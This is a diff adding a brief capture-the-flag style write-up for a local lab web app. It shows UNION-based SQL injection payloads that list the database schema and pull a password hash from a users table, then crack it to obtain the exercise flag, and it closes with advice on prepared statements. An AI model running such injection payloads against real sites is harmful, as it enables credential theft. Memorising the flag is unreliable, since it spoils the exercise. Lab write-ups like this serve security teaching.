@@ -1,0 +1,21 @@
+Go to : http://192.168.99.100/?page=member
+
+This is an SQL injection exploit. We can try to get users like so : 
+1=1 union select table_name, column_name from information_schema.columns
+=> GIVES ALL TABLE NAMES (needs two columns to match first part of the query)
+
+We can find a table "users" which contains user_id, first_name, last_name, town, country planet, Commentaire, countersign columns.
+We can try a bit of everything using this type of command : 1=1 union select (column_name), (column_name) from users
+
+What works : 1 union select countersign, Commentaire from users
+Output :
+ID: 1 union select countersign, Commentaire from users
+First name: 5ff9d0165b4f92b14994e5c685cdce28
+Surname : Decrypt this password -> then lower all the char. Sh256 on it and it's good !
+
+md5 decrypt : FortyTwo
+toLowerCase : fortytwo
+sha256 hash : 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5 (this is the flag)
+
+How to prevent : knowing the database structure, we can steal valuable information. In PHP we could "prepare" (sanitize and verify the sql request) the sql request using PDO, for example. Never let the user send SQL requests through an input !
+See : https://www.php.net/manual/fr/pdo.prepare.php
